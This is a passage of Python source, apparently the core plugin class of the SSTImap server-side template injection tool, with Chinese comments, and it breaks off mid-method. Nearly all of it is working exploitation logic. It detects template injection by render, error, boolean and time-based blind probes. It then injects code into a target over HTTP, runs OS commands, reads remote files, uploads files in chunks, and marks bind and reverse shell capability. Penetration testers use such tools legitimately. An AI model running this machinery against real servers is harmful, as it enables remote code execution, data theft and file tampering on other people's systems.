from core import bash
from utils.strings import chunk_seq, md5, formatters
from utils import rand, config
from utils.loggers import log
from core.matcher import match
import re
import itertools
import base64
import collections
import threading
import sys
import importlib
import os

loaded_plugins = {}
failed_plugins = []


def load_plugins():
    importlib.invalidate_caches()
    groups = os.scandir(f"{sys.path[0]}/plugins")
    groups = filter(lambda x: x.is_dir(), groups)
    for g in groups:
        modules = os.scandir(f"{sys.path[0]}/plugins/{g.name}")
        modules = filter(lambda x: (x.name.endswith(".py") and not x.name.startswith("_")), modules)
        for m in modules:
            try:
                importlib.import_module(f"plugins.{g.name}.{m.name[:-3]}")
            except Exception as e:
                log.log(22, f'''加载插件时出错 {g.name}/{m.name[:-3]}: {e}''')


def unload_plugins():
    global loaded_plugins
    global failed_plugins
    for k in loaded_plugins:
        for p in loaded_plugins[k]:
            if p.__module__ in sys.modules:
                del sys.modules[p.__module__]
    loaded_plugins = {}
    for p in failed_plugins:
        if p.__module__ in sys.modules:
            del sys.modules[p.__module__]
    failed_plugins = []
    importlib.invalidate_caches()


def _recursive_update(d, u):
    # Update value of a nested dictionary of varying depth
    for k, v in u.items():
        if isinstance(d, collections.abc.Mapping):
            if isinstance(v, collections.abc.Mapping):
                r = _recursive_update(d.get(k, {}), v)
                d[k] = r
            else:
                d[k] = u[k]
        else:
            d = {k: u[k]}
    return d


class Plugin(object):
    generic_plugin = False
    legacy_plugin = False
    extra_plugin = False
    no_tests = False
    priority = 10
    header_type = 'cat'
    header_length = 10
    formatter = "default"
    sstimap_version = config.version
    plugin_info = {
        "Description": '该插件没有说明。',
        "Usage notes": "",
        "Authors": [],
        "References": [],
        "Engine": [],
        "Options": [],
    }
    language = ""
    language_variant = ""

    def __init__(self, channel):
        # HTTP通道
        self.channel = channel
        # 将 HTTP 响应时间收集到双端队列中以用于
        # 调整盲值的平均响应时间。
        # 预计安全启动需要 0.5 秒。
        self.render_req_tm = collections.deque([0.5], maxlen=5)
        # 基于时间的延迟盲注。这将被添加
        # 渲染值的平均响应时间。
        self.tm_delay = self.channel.args.get('time_based_blind_delay', 4)
        self.tm_verify_delay = self.channel.args.get('time_based_verify_blind_delay', 30)
        self.tm_varied = False
        # 声明对象属性
        self.actions = {}
        self.contexts = []
        self.set("formatter", self.__class__.__dict__.get("formatter", "default"))
        self.default_wrapper = 'SSTIMAP:code;' if self.get("formatter", "default") == "sstimap" else '{code}'
        self.channel.default_wrapper = self.default_wrapper
        # 调用用户定义的init
        self.language_init()
        self.init()

    def __init_subclass__(cls, **kwargs):
        module = cls.__module__.split(".")
        # 插件、组和语言名称
        cls.plugin = cls.__name__
        cls.group = module[1]
        if cls.language_variant:
            cls.language += f":{cls.language_variant}"
        if module[0] in ["plugins", "data_types"]:
            if config.compare_versions(cls.sstimap_version, config.min_version['plugin']) == "<":
                log.log(22, f'''{cls.__name__} 插件已过时，无法加载''')
                log.log(29, f"{cls.__name__} 专为版本而设计 {cls.sstimap_version}, "
                            f"expected {config.min_version['plugin']} - {config.version}")
                failed_plugins.append(cls)
                return
            if config.compare_versions(cls.sstimap_version, config.version) == ">":
                log.log(22, f'''{cls.__name__} 插件需要 SSTImap 更新且无法加载''')
                log.log(29, f"{cls.__name__} 专为版本而设计 {cls.sstimap_version}, "
                            f"expected {config.min_version['plugin']} - {config.version}")
                failed_plugins.append(cls)
                return
            if module[1] in loaded_plugins:
                loaded_plugins[module[1]].append(cls)
            else:
                loaded_plugins[module[1]] = [cls]

    def language_init(self):
        # 被覆盖。这个可以调用self.update_actions
        # 和 self.set_contexts
        pass

    def init(self):
        # 被覆盖。这个可以调用self.update_actions
        # 和 self.set_contexts
        pass

    def rendered_detected(self):
        call = self.get_call_sequence('render')
        error = self.get('error', False)
        action_evaluate = self.actions.get('evaluate', {}).copy()
        if error and 'evaluate_error' in self.actions:
            action_evaluate.update(self.actions.get('evaluate_error', {}))
        test_os_code = action_evaluate.get('test_os')
        test_os_code_expected = action_evaluate.get('test_os_expected')
        test_eval_code = action_evaluate.get('test_eval')
        test_eval_expected = action_evaluate.get('test_eval_expected')
        if "evaluate" in call:
            self.set('evaluate', self.language)
        # 在尾随换行符的情况下使用 rstrip
        if test_os_code and test_os_code_expected:
            os = self.evaluate(test_os_code)
            if os and re.search(test_os_code_expected, os):
                self.set('os', os)
                if not self.get('evaluate'):
                    self.set('evaluate', self.language)
                    call += self.get_call_sequence('evaluate')
        if not self.get('evaluate') and test_eval_code and test_eval_expected \
                and test_eval_expected == self.evaluate(test_eval_code).rstrip():
            self.set('evaluate', self.language)
            call += self.get_call_sequence('evaluate')
        action_execute = self.actions.get('execute', {}).copy()
        if error and 'execute_error' in self.actions:
            action_execute.update(self.actions.get('execute_error', {}))
        test_cmd_code = action_execute.get('test_cmd')
        test_cmd_code_expected = action_execute.get('test_cmd_expected')
        test_cmd_os = action_execute.get('test_os')
        test_cmd_os_expected = action_execute.get('test_os_expected')
        # 在尾随换行符的情况下使用 rstrip
        if "execute" in call:
            self.set('execute', True)
        if test_cmd_os and test_cmd_os_expected and not (self.get('execute') and self.get('os')):
            os = self.execute(test_cmd_os)
            if os and re.search(test_cmd_os_expected, os):
                self.set('os', os)
                if not self.get('execute'):
                    self.set('execute', True)
        if not self.get('execute') and test_cmd_code and test_cmd_code_expected \
                and test_cmd_code_expected == self.execute(test_cmd_code).rstrip():
            self.set('execute', True)
        if self.check_call_sequence('write'):
            self.set('write', True)
        if self.check_call_sequence('read'):
            self.set('read', True)
        if self.check_call_sequence('bind_shell'):
            self.set('bind_shell', True)
        if self.check_call_sequence('reverse_shell'):
            self.set('reverse_shell', True)

    def blind_detected(self):
        call = self.get_call_sequence('blind')
        test_eval_code = self.actions.get('evaluate', {}).get('test_eval')
        if "evaluate_blind" in call or (test_eval_code and self.evaluate_blind(test_eval_code)):
            self.set('evaluate_blind', self.language)
            call += self.get_call_sequence('evaluate_blind')
        test_cmd_code = self.actions.get('execute', {}).get('test_cmd')
        if "execute_blind" in call or (test_cmd_code and self.execute_blind(test_cmd_code)):
            self.set('execute_blind', True)
        if self.check_call_sequence('write'):
            self.set('write', True)
        if self.check_call_sequence('bind_shell'):
            self.set('bind_shell', True)
        if self.check_call_sequence('reverse_shell'):
            self.set('reverse_shell', True)

    def get_call_sequence(self, action, error=None, boolean=None, blind=None):
        res = [action]
        if action in ["render"]:
            res += ["inject"]
        elif action not in ["inject"]:
            payload = self.actions.get(action, {}).copy()
            action_base = action.split("_")[0]
            if error is None:
                error = self.get('error', False)
            if boolean is None:
                boolean = self.get('boolean', False)
            if blind is None:
                blind = self.get('blind', False)
            if error and f'{action_base}_error' in self.actions:
                payload.update(self.actions.get(f'{action_base}_error', {}))
            elif boolean and action != action_base and f'{action_base}_boolean' in self.actions:
                payload.update(self.actions.get(f'{action_base}_boolean', {}))
            elif action == 'blind' and self.get('boolean', False) and f'boolean' in self.actions:
                payload.update(self.actions.get(f'boolean', {}))
            default = 'render' if action in ['execute', 'evaluate', 'read', 'md5'] else 'inject'
            call_name = payload.get('call', default)
            res += self.get_call_sequence(call_name, error, boolean, blind)
        return res

    def check_call_sequence(self, action, error=None, boolean=None, blind=None, test=False):
        if action == "inject":
            return True
        action_base = action.split("_")[0]
        if error is None:
            error = self.get('error', False)
        if boolean is None:
            boolean = self.get('boolean', False)
        if blind is None:
            blind = self.get('blind', False)
        # 检查动作是否实现，检测后才运行
        if not test and action in ["evaluate", "execute", "evaluate_blind", "execute_blind"] and \
                not (self.get(f"{action_base}_blind") or self.get(action_base)):
            return False
        # 检查payload是否存在
        if not (self.actions.get(action) or (error and self.actions.get(f'{action_base}_error')) or
                (action != action_base and (boolean and self.actions.get(f'{action_base}_boolean')))):
            return False
        call = self.get_call_sequence(action, error, boolean, blind)
        if len(call) > 1:
            return self.check_call_sequence(call[1], error, boolean, blind, test)
        return True

    def detect(self):
        formatter = formatters[self.get("formatter", "default")]
        # 获取用户提供的技术
        techniques = self.channel.args.get('technique')

        tested = []
        for technique in techniques:
            if self.get('engine'):
                # 已找到引擎，无需进一步测试
                break
            if technique in tested:
                # 已经测试过这项技术
                continue
            tested.append(technique)

            # 渲染技术
            if technique == 'R':
                # 开始检测
                self._detect_render()
                # 如果未设置渲染，请检查不可靠渲染
                if self.get('render') is None:
                    self._detect_unreliable_render()
                # 否则，打印并执行Rendered_Detected()
                else:
                    # 如果到这里，渲染就确认了
                    prefix = self.get('prefix', '')
                    render = formatter(self.get('render', self.default_wrapper), {'code': '*'})
                    wrapper = formatter(self.get('wrapper', self.default_wrapper), {'code': render})
                    suffix = self.get('suffix', '')
                    log.log(24, f'''{self.plugin} 插件已确认注入标签\'{repr(prefix).strip("'")}{repr(wrapper).strip("'")}{repr(suffix).strip("'")}' ''')
                    # 清理之前所有不可靠的渲染数据
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # 设置基本信息
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # 设置环境
                    self.rendered_detected()

            # 基于错误的技术
            # 这只是具有不同载荷的渲染技术
            elif technique == 'E':
                # 开始检测
                self._detect_render(reflection="render_error")
                # 如果未设置错误，请检查不可靠的错误消息
                if self.get('error') is None:
                    self._detect_unreliable_render(reflection="render_error")
                # 否则，打印并执行Rendered_Detected()
                else:
                    # 如果这里，则确认错误反映
                    log.log(24, f'''{self.plugin} 插件已确认基于错误的注入''')
                    # 清理以前任何不可靠的错误消息数据
                    self.delete('unreliable_render_error')
                    self.delete('unreliable')
                    # 设置基本信息
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # 设置环境
                    self.rendered_detected()

            # 基于时间的盲法
            elif technique == 'B' and self.channel.boolean_enabled:
                self._detect_blind(variant="boolean")
                if self.get('boolean'):
                    log.log(24, f'{self.plugin} 插件已确认布尔报错型盲注')
                    # 清理之前所有不可靠的渲染数据
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # 设置基本信息
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # 设置环境
                    self.blind_detected()

            # 基于时间的盲法
            elif technique == 'T':
                self._detect_blind()
                if self.get('blind'):
                    log.log(24, f'{self.plugin} 插件已确认基于时间的盲注')
                    # 清理之前所有不可靠的渲染数据
                    self.delete('unreliable_render')
                    self.delete('unreliable')
                    # 设置基本信息
                    self.set('engine', self.plugin)
                    self.set('language', self.language)
                    # 设置环境
                    self.blind_detected()

    def _generate_contexts(self):
        formatter = formatters[self.get("formatter", "default")]
        # 循环所有上下文
        for ctx in self.contexts:
            # 如果 --force-level 跳过任何其他级别
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[0] is not None and ctx.get('level') != int(force_level[0]):
                continue
            # 跳过任何高于所需级别的上下文
            if not force_level and ctx.get('level') > self.channel.args.get('level'):
                continue
            # 后缀是固定的
            # 如果上下文没有闭包，则生成一个带有零长度字符串的闭包
            suffix = ctx.get('suffix', '')
            suffix_format = self.get("formatter", "default") == "sstimap" or "{closure}" in suffix or "{rclosure}" in suffix
            suffix_text = (formatter(suffix, {'closure': '', 'rclosure': ''}) if suffix_format else suffix).replace('\n', '\\n')
            prefix_text = formatter(ctx.get('prefix', ''), {'closure': ''}).replace('\n', '\\n')
            wrappers = ctx.get('wrappers', [self.default_wrapper])
            if ctx.get('closures'):
                closures = self._generate_closures(ctx)
            else:
                closures = [('', '')]
            if len(closures)*len(wrappers) > 1:
                level = f'（级别 {ctx.get("level", 1)}）' if self.get('level') else ''
                log.log(26, f'''{self.plugin} 插件正在测试 {prefix_text}*{suffix_text} 代码上下文转义的 {len(closures)*len(wrappers)} 种变体''' + level)
            for wrapper in wrappers:
                for closure, rclosure in closures:
                    # 用闭包格式化前缀
                    prefix = formatter(ctx.get('prefix', ''), {'closure': closure})
                    if suffix_format:
                        suffix = formatter(ctx.get('suffix', ''), {'closure': closure, 'rclosure': rclosure})
                    yield prefix, suffix, wrapper

    """
    Detection of unreliable error message or rendering tag with no header and trailer.
    """
    def _detect_unreliable_render(self, reflection="render"):
        render_action = self.actions.get(reflection)
        if not render_action:
            return
        # 打印要测试的内容
        if reflection == "render":
            log.debug(f'{self.plugin} 插件正在测试文本上下文上不可靠的渲染')
        elif reflection == "render_error":
            log.debug(f'{self.plugin} 插件正在测试不可靠的错误消息')
        # 准备要在服务器端评估的基本操作
        expected = render_action.get('test_render_expected')
        payload = render_action.get('test_render')
        # 带有由请求头和尾部包裹的载荷的探针，没有后缀或前缀。
        # 测试是否包含，因为该页面包含其他垃圾
        if expected in self.render(code=payload, header='', trailer='', header_rand=[0, 0],
                                   trailer_rand=[0, 0], prefix='', suffix='', error=reflection == "render_error"):
            # 如果第一个发现不可靠渲染则打印
            if not self.get(f'unreliable_{reflection}'):
                if reflection == "render":
                    formatter = formatters[self.get("formatter", "default")]
                    log.log(25, f"{self.plugin} 插件检测到标签渲染不可靠 "
                                f"{repr(formatter(render_action.get('render'), {'code': '*'}))}, skipping")
                elif reflection == "render_error":
                    log.log(25, f"{self.plugin} 插件检测到不可靠的错误消息，跳过")
            self.set(f'unreliable_{reflection}', render_action.get('render'))
            self.set('unreliable', self.plugin)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_blind(self, variant="blind"):
        action = self.actions.get(variant, {})
        payload_true = action.get('test_bool_true')
        payload_false = action.get('test_bool_false')
        call_name = action.get('call', 'inject')
        # 如果缺少或未设置调用功能则跳过
        if not (action and payload_true and payload_false and call_name and hasattr(self, call_name) and
                self.check_call_sequence(variant, boolean=(variant == "boolean"), test=True)):
            return
        # 打印要测试的内容
        technique = '时间型盲注' if variant == 'blind' else '布尔报错型盲注'
        log.log(23, f'{self.plugin} 插件正在测试' + technique)
        kwarg = {variant: True}
        for prefix, suffix, wrapper in self._generate_contexts():
            # 进行真假测试
            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                continue
            detail = {f'{variant}_true': self._inject_verbose}
            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                continue
            detail[f'{variant}_false'] = self._inject_verbose
            # 我们可以假设这里盲目是真的
            log.log(28, f'{self.plugin} 插件已检测到可能的' + technique)
            self.set(f'{variant}_test', True)
            if variant == 'blind':
                detail['average'] = sum(self.render_req_tm) / len(self.render_req_tm)
            elif variant == 'boolean':
                payload_true = action.get('verify_bool_true')
                payload_false = action.get('verify_bool_false')
            # 以更大的延迟再次进行真假测试
            if not getattr(self, call_name)(code=payload_true, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                self.set(f'{variant}_test', False)
                log.log(25, '可能的' + technique + '结果是假阳性')
                continue
            detail[f'{variant}_true_verify'] = self._inject_verbose
            if getattr(self, call_name)(code=payload_false, prefix=prefix, suffix=suffix, wrapper=wrapper, **kwarg):
                self.set(f'{variant}_test', False)
                log.log(25, '可能的' + technique + '结果是假阳性')
                continue
            self.set(f'{variant}_test', False)
            detail[f'{variant}_false_verify'] = self._inject_verbose
            if variant == 'blind':
                detail['average_verify'] = sum(self.render_req_tm) / len(self.render_req_tm)
            self.set(variant, True)
            self.set('prefix', prefix)
            self.set('suffix', suffix)
            self.set('wrapper', wrapper)
            self.set('wrapper_type', 'local')  # 应该始终作为盲人的后备
            self.channel.detected(variant, detail)
            return

    """
    Detection of the rendering tag and context.
    """
    def _detect_render(self, reflection="render"):
        render_action = self.actions.get(reflection)
        if not (render_action and
                self.check_call_sequence(reflection, error=(reflection == "render_error"), test=True)):
            return
        # 打印要测试的内容
        if reflection == "render":
            formatter = formatters[self.get("formatter", "default")]
            log.log(23, f"{self.plugin} 插件正在使用标签测试渲染 "
                        f"{repr(formatter(render_action.get('render'), {'code': '*'}))}")
        elif reflection == "render_error":
            log.log(23, f'{self.plugin} 插件正在测试基于错误的注入')
        for prefix, suffix, wrapper in self._generate_contexts():
            # 准备要在服务器端评估的基本操作
            expected = render_action.get('test_render_expected')
            payload = render_action.get('test_render')
            wrapper_type = render_action.get(f'wrapper_type', 'local')
            header_rand = [rand.randint_n(self.header_length, 4), rand.randint_n(self.header_length, 4)]
            header = render_action.get('header')
            trailer_rand = [rand.randint_n(self.header_length, 4), rand.randint_n(self.header_length, 4)]
            trailer = render_action.get('trailer')
            # 第一个探测，载荷由请求头和尾部包裹，没有后缀或前缀
            if expected == self.render(code=payload, header=header, trailer=trailer, header_rand=header_rand,
                                       trailer_rand=trailer_rand, prefix=prefix, suffix=suffix, wrapper=wrapper,
                                       wrapper_type=wrapper_type, error=reflection == "render_error"):
                self.set('render', render_action.get('render'))
                self.set('error', reflection == "render_error")
                self.set('header', render_action.get('header'))
                self.set('trailer', render_action.get('trailer'))
                self.set('prefix', prefix)
                self.set('suffix', suffix)
                self.set('wrapper', wrapper)
                self.set('wrapper_type', wrapper_type)
                self.channel.detected(reflection, {'expected': expected})
                return

    """
    Raw inject of the payload.
    """
    def inject(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
        blind = kwargs.get('blind', self.get('blind', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        injection = prefix + formatters[self.get("formatter", "default")](wrapper, {'code': code}) + suffix
        log.debug(f'[request {self.plugin}] {repr(self.channel.url)}')
        # 如果请求是盲目的
        if blind:
            expected_delay = self._get_expected_delay()
            text, delta, vector = self.channel.req(injection)
            result = delta >= expected_delay
            log.debug(f'[blind {self.plugin}] 请求已接受 {delta}. '
                      f'{expected_delay} 是阈值，返回 {result}')
            self._inject_verbose = {'result': result, 'payload': injection, 'expected_delay': expected_delay}
            return result
        elif boolean:
            text, delta, vector = self.channel.req(injection)
            if self.channel.args.get("boolean_regex_ok"):
                try:
                    pattern = re.compile(self.channel.args.get('boolean_regex_ok'))
                except Exception:
                    log.log(22, f'无效回复：“{self.channel.args.get("boolean_regex_ok")}"')
                    return
                result = not not pattern.search(text)
                log.debug(f'[boolean {self.plugin}] 根据 RE 检查请求： '
                          f'{self.channel.args.get("boolean_regex_err")} （确定），返回 {str(result)}')
                self._inject_verbose = {'result': result, 'payload': injection, 'regex_type': "Normal",
                                        'regex': self.channel.args.get('boolean_regex_ok')}
            elif self.channel.args.get("boolean_regex_err"):
                try:
                    pattern = re.compile(self.channel.args.get('boolean_regex_err'))
                except Exception:
                    log.log(22, f'无效回复：“{self.channel.args.get("boolean_regex_err")}"')
                    return
                result = not pattern.search(text)
                log.debug(f'[boolean {self.plugin}] 根据 RE 检查请求： '
                          f'{self.channel.args.get("boolean_regex_err")} （错误），正在返回 {str(result)}')
                self._inject_verbose = {'result': result, 'payload': injection, 'regex_type': "Error",
                                        'regex': self.channel.args.get('boolean_regex_err')}
            else:
                result = match(self.channel, vector)
                log.debug(f'[boolean {self.plugin}] 请求返回 {vector}. '
                          f'{self.channel.page_vector} 预计，返回 {str(result)}')
                self._inject_verbose = {'result': result, 'payload': injection, 'vector': vector,
                                        'expected': self.channel.page_vector, 'profile': self.channel.page_profile}
            return result
        else:
            text, delta, vector = self.channel.req(injection)
            # 将执行时间附加到缓冲区
            self.render_req_tm.append(delta)
            return text.strip() if text else text

    """
    Inject the rendered payload and get the result.
    
    The request is composed by parameters from:
    
        - Already rendered passed **kwargs, or
        - self.get() to be rendered, or
        - self.actions.get() to be rendered
        
    """
    def render(self, code, **kwargs):
        formatter = formatters[self.get("formatter", "default")]
        error = kwargs.get('error', self.get('error', False))
        call_name = 'render_error' if error else 'render'
        # 如果 header == ''，则不发送请求头
        header_template = kwargs.get('header')
        header_type = self.header_type
        if header_template != '':
            header_template = kwargs.get('header', self.get('header'))
            if not header_template:
                header_template = self.actions.get(call_name, {}).get('header')
            if header_template:
                header_rand = kwargs.get('header_rand', self.get('header_rand', [rand.randint_n(self.header_length,4),
                                                                                 rand.randint_n(self.header_length,4)]))
                header = formatter(header_template, {'header': header_rand})
        else:
            header_rand = [0, 0]
            header = ''
        # 如果预告片==''，则不发送请求头
        trailer_template = kwargs.get('trailer')
        if trailer_template != '':
            trailer_template = kwargs.get('trailer', self.get('trailer'))
            if not trailer_template:
                trailer_template = self.actions.get(call_name, {}).get('trailer')
            if trailer_template:
                trailer_rand = kwargs.get('trailer_rand', self.get('trailer_rand', [rand.randint_n(self.header_length,4),
                                                                                    rand.randint_n(self.header_length,4)]))
                trailer = formatter(trailer_template, {'trailer': trailer_rand})
        else:
            trailer_rand = [0, 0]
            trailer = ''
        # 确保长度恒定
        payload_template = kwargs.get('render', self.get('render'))
        if not payload_template:
            payload_template = self.actions.get(call_name, {}).get('render')
        if not payload_template:
            # 退出，actions.render(_error).render 未设置
            return
        payload = formatter(payload_template, {'code': code})
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
        wrapper_type = kwargs.get('wrapper_type', self.get('wrapper_type', 'local'))
        blind = kwargs.get('blind', False)
        boolean = kwargs.get('boolean', False)
        if wrapper_type == "local":
            injection = formatter(wrapper, {'code': header}) + \
                        formatter(wrapper, {'code': payload}) + \
                        formatter(wrapper, {'code': trailer})
        elif wrapper_type == "global":
            injection = formatter(wrapper, {'code': header + payload + trailer})
        else:  # 如果包装器类型未知，则回退
            injection = header + payload + trailer
        if header_type == "add":
            header_expected = str(sum(header_rand))
            trailer_expected = str(sum(trailer_rand))
        elif header_type == "cat":
            header_expected = "".join([str(x) for x in header_rand])
            trailer_expected = "".join([str(x) for x in trailer_rand])
        else:
            header_expected = ""
            trailer_expected = ""
        # 按顺序保存渲染的平均HTTP请求时间
        # 更好地调整盲目请求超时。
        # 将包装器重置为空，因为它已经应用了
        result_raw = self.inject(code=injection, prefix=prefix, suffix=suffix,
                                 blind=blind, boolean=boolean, wrapper=self.default_wrapper)
        if blind or boolean:
            return result_raw
        else:
            result = ''
            # 如果未指定请求头和标尾，则返回 result_raw
            if not header and not trailer:
                return result_raw
            # 如果指定的话，使用请求头和标尾剪切结果
            if header:
                before, _, result_after = result_raw.partition(header_expected)
            if trailer and result_after:
                result, _, after = result_after.partition(trailer_expected)
            exfiltrate = self.actions.get(call_name, {}).get('exfiltrate', 'plain')
            if exfiltrate == 'base64':
                try:
                    result = base64.b64decode(result).decode()
                except Exception:
                    log.log(25, '解码泄露的 Base64 字符串时出错，请手动检查。')
            return result.strip() if result else result

    def set(self, key, value):
        self.channel.data[key] = value

    def get(self, key, default=None):
        return self.channel.data.get(key, default)
        
    def delete(self, key):
        if key in self.channel.data:
            del self.channel.data[key]

    def _generate_closures(self, ctx):
        closures_dict = ctx.get('closures', {'0': []})
        closures = []
        # 循环所有闭包名称
        for ctx_closure_level, ctx_closure_matrix in closures_dict.items():
            # 如果 --force-level 跳过任何其他级别
            force_level = self.channel.args.get('force_level')
            if force_level and force_level[1] and ctx_closure_level != int(force_level[1]):
                continue
            # 跳过任何高于所需级别的关闭列表
            if not force_level and ctx_closure_level > self.channel.args.get('level'):
                continue
            closures += [(''.join([y[0] for y in x]), ''.join([y[1] for y in x][::-1]))
                         for x in itertools.product(*ctx_closure_matrix)]
        closures = sorted(set(closures), key=lambda x: len(x[0]+x[1]))
        # 退货
        return closures

    """ Overridable function to get MD5 hash of remote files."""
    def md5(self, remote_path):
        error = self.get('error', False)
        action = self.actions.get('md5', {}).copy()
        if error and 'md5_error' in self.actions:
            action.update(self.actions.get('md5_error', {}))
        payload = action.get('md5')
        call_name = action.get('call', 'render')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        execution_code = formatters[self.get("formatter", "default")](payload, {'path': remote_path})
        result = getattr(self, call_name)(code=execution_code)
        exfiltrate = action.get('exfiltrate', 'plain')
        if exfiltrate == 'base64':
            try:
                result = base64.b64decode(result).decode()
            except Exception:
                log.log(25, '解码泄露的 Base64 字符串时出错，请手动检查。')
        # 检查md5结果格式
        if re.match(r"([a-fA-F\d]{32})", result):
            return result
        else:
            return False

    """ Overridable function to remotely compare MD5 hash of files."""
    def md5_blind(self, remote_path, expected):
        boolean = self.get('boolean', False)
        action = self.actions.get('md5_blind', {}).copy()
        if boolean and 'md5_boolean' in self.actions:
            action.update(self.actions.get('md5_boolean', {}))
        payload = action.get('md5_blind')
        call_name = action.get('call', 'inject')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        data = {'path': remote_path, 'md5': expected, "delay": self._get_expected_delay()}
        execution_code = formatters[self.get("formatter", "default")](payload, data)
        return getattr(self, call_name)(code=execution_code)

    """ Overridable function to remotely check existence of files."""
    def exists_blind(self, remote_path):
        boolean = self.get('boolean', False)
        action = self.actions.get('md5_blind', {}).copy()
        if boolean and 'md5_boolean' in self.actions:
            action.update(self.actions.get('md5_boolean', {}))
        payload = action.get('exists_blind')
        call_name = action.get('call', 'inject')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        data = {'path': remote_path, "delay": self._get_expected_delay()}
        execution_code = formatters[self.get("formatter", "default")](payload, data)
        return getattr(self, call_name)(code=execution_code)

    """ Overridable function to detect read capabilities. """
    def detect_read(self):
        # 仅当评估时才假设具有读取能力
        # 已经被检测到并且 self.actions['read'] 退出
        if not self.get('evaluate') or not self.actions.get('read'):
            return
        self.set('read', True)

    """ Overridable function to read remote files. """
    def read(self, remote_path):
        error = self.get('error', False)
        action = self.actions.get('md5', {}).copy()
        if error and 'read_error' in self.actions:
            action.update(self.actions.get('read_error', {}))
        payload = action.get('read')
        call_name = action.get('call', 'render')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        # 获取远程文件md5
        md5_remote = self.md5(remote_path)
        if not md5_remote:
            log.log(25, '获取远程文件 md5 时出错，请检查存在性和权限')
            return
        execution_code = formatters[self.get("formatter", "default")](payload, {'path': remote_path})
        data_b64encoded = getattr(self, call_name)(code=execution_code)
        data = base64.b64decode(data_b64encoded)
        if not md5(data) == md5_remote:
            log.log(25, '远程文件md5不匹配，手动检查')
        else:
            log.log(21, '文件下载正确')
        return data

    def write(self, data, remote_path):
        formatter = formatters[self.get("formatter", "default")]
        action = self.actions.get('write', {})
        payload_write = action.get('write')
        payload_truncate = action.get('truncate')
        call_name = action.get('call', 'inject')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload_write or not payload_truncate or not call_name or not hasattr(self, call_name):
            return
        # 检查存在并用 --force-overwrite 覆盖
        if self.get('blind') or self.get('boolean'):
            res = self.exists_blind(remote_path)
        else:
            res = self.md5(remote_path)
        if res is None:
            log.log(25, '插件可能会覆盖文件，请使用 --force-overwrite 运行以继续')
            return
        elif res and not self.channel.args.get('force_overwrite'):
            log.log(25, '远程文件已存在，使用 --force-overwrite 运行进行覆盖')
            return
        execution_code = formatter(payload_truncate, {'path': remote_path})
        getattr(self, call_name)(code=execution_code)
        # 以 500 个字符为单位上传文件
        for chunk in chunk_seq(data, 500):
            log.debug(f'[b64 encoding] {chunk}')
            execution_code = formatter(payload_write, {'path': remote_path, 'chunk': chunk})
            getattr(self, call_name)(code=execution_code)
        if self.get('blind') or self.get('boolean'):
            res = self.md5_blind(remote_path, md5(data))
        else:
            res = md5(data) == self.md5(remote_path)
        if res is None:
            log.log(25, '插件无法检查上传正确性，请手动检查')
        elif not res:
            log.log(25, '远程文件md5不匹配，手动检查')
        else:
            log.log(21, '文件上传正确')

    def evaluate(self, code,  **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
        blind = kwargs.get('blind', False)
        error = kwargs.get('error', self.get('error', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('evaluate', {}).copy()
        if error and 'evaluate_error' in self.actions:
            action.update(self.actions.get('evaluate_error', {}))
        payload = action.get('evaluate')
        call_name = action.get('call', 'render')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        execution_code = formatters[self.get("formatter", "default")](payload, {"code": code})
        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                          wrapper=wrapper, blind=blind, boolean=boolean)
        if type(result) == str:
            exfiltrate = action.get('exfiltrate', 'plain')
            if exfiltrate == 'base64':
                try:
                    result = base64.b64decode(result).decode()
                except Exception:
                    log.log(25, '解码泄露的 Base64 字符串时出错，请手动检查。')
        return result

    def execute(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
        suffix = kwargs.get('suffix', self.get('suffix', ''))
        wrapper = kwargs.get('wrapper', self.get('wrapper', self.default_wrapper))
        blind = kwargs.get('blind', False)
        error = kwargs.get('error', self.get('error', False))
        boolean = kwargs.get('boolean', self.get('boolean', False))
        action = self.actions.get('execute', {}).copy()
        if error and 'execute_error' in self.actions:
            action.update(self.actions.get('execute_error', {}))
        payload = action.get('execute')
        call_name = action.get('call', 'render')
        # 如果缺少或未设置调用功能则跳过
        if not action or not payload or not call_name or not hasattr(self, call_name):
            return
        execution_code = formatters[self.get("formatter", "default")](payload, {"code": code})
        result = getattr(self, call_name)(code=execution_code, prefix=prefix, suffix=suffix,
                                          wrapper=wrapper, blind=blind, boolean=boolean)
        if type(result) == str:
            result = result.replace('\\n', '\n').replace('<br>', '\n')
            exfiltrate = action.get('exfiltrate', 'plain')
            if exfiltrate == 'base64':
                try:
                    result = base64.b64decode(result).decode()
                except Exception:
                    log.log(25, '解码泄露的 Base64 字符串时出错，请手动检查。')
        return result

    def evaluate_blind(self, code, **kwargs):
        prefix = kwargs.get('prefix', self.get('prefix', ''))
